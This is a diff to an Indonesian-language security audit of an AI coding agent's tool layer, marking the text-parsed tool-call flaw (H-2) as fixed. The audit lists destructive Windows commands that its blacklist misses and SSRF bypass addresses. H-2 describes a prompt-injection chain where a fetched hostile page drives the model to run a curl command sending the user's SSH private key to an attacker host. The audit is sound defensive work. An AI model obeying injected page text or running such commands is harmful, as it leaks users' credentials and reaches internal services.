@@ -22,13 +22,14 @@ Aturan pertama `PROTECTED_PATH_PATTERNS` (`/(?:\s|$|[;&|><])`) juga tidak catch 
 Windows lebih bolong: blacklist berasumsi POSIX. `rd /s /q %USERPROFILE%\Documents`, `del /f`, `Remove-Item -Recurse -Force` → tidak match satu pattern pun → jalan senyap (cmd.exe via `shell:` di `src/tools/execute_command.js:52-54`).
 Fix arah: parse argv command (shlex-like), cek target path terhadap jail; tambah pattern Windows (rd/del/Remove-Item/format) + protected list `/root /home /usr /bin /sdcard`.
 
-### H-2. parseTextToolCalls mengeksekusi tool call yang di-fabrikasi dari teks biasa (false-positive execution + prompt-injection amplifier)
+### H-2. [FIXED 2026-09-15] parseTextToolCalls mengeksekusi tool call yang di-fabrikasi dari teks biasa (false-positive execution + prompt-injection amplifier)
 `src/llm/openai.js:663-684` (`classifyStandaloneJson`): setiap objek JSON dengan key `command`/`cmd` di teks model → jadi call `execute_command`, **tanpa perlu nama tool**. `extractInlineNameCalls` (`:649-661`): string `read_file {...}` di mana pun → call. Fallback ini aktif di dua tempat: `openai.js:341-352` (stream) + `orchestrator.js:357-362` (non-native).
 
 Skenario konkret:
 1. Model menjelaskan: `Contoh: gunakan {"command": "git status"}` → JSON polos itu dieksekusi betulan.
 2. Lethal trifecta: `web_fetch` halaman hostile → kontennya (masih teks, masuk context) mendorong model menulis ulang `{"command": "curl https://evil/$(cat ~/.ssh/id_rsa)"}` → `curl` tanpa pipe-to-shell = tidak risky (rules.js:91) → exfiltrasi jalan tanpa prompt. Batas "tool result = data, bukan instruksi" tidak ditegakkan di layer parsing.
 Fix arah: klasifikasi heuristik (standalone JSON / inline name) jangan auto-execute — minimal wajib nama tool eksplisit + perlakukan hasil fallback sebagai proposal yang butuh user-visible callout; atau hanya parse blok terverifikasi saat native tool_calls kosong *dan* model current provider diketahui butuh.
+Status: Selesai diperbaiki (2026-09-15). `classifyStandaloneJson` dihapus, `extractInlineNameCalls` diketatkan ke awal baris/tag, duplikasi container XML dieliminasi, fallback tool calls ditandai `isFallback: true` dan di-gate prompt konfirmasi HITL di SecurityGuard.
 
 ### H-3. web_fetch: SSRF via redirect + bypass regex privat-IP
 `src/tools/web_fetch.js:12-38` cek hostname **hanya URL awal**; fetch pakai `redirect: 'follow'` (`:60`) tanpa re-check → publik host 302 ke `http://127.0.0.1:PORT` / `http://[::1]` / `http://169.254.169.254/` = SSRF penuh. Regex juga lexical: `http://2130706433` (decimal 127.0.0.1), `http://0x7f.0.0.1`, `http://127.1`, `http://0177.0.0.1`, IPv6-mapped `::ffff:127.0.0.1`, CGNAT `100.64/10` (Tailscale/DS-Lite) semua lolos.
@@ -80,5 +81,5 @@ Fix arah: sanitize `/\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07/g` dari string ta
 
 1. H-1 (gap rules — paling murah diperbaiki, paling besar dampak).
 2. H-3 (redirect loop + IP check).
-3. H-2 (ketatkan heuristik parseTextToolCalls).
+3. H-2 (ketatkan heuristik parseTextToolCalls) — SELESAI (2026-09-15).
 4. M-1 (realpath), M-3 (sanitize ESC), M-2 (streaming caps).
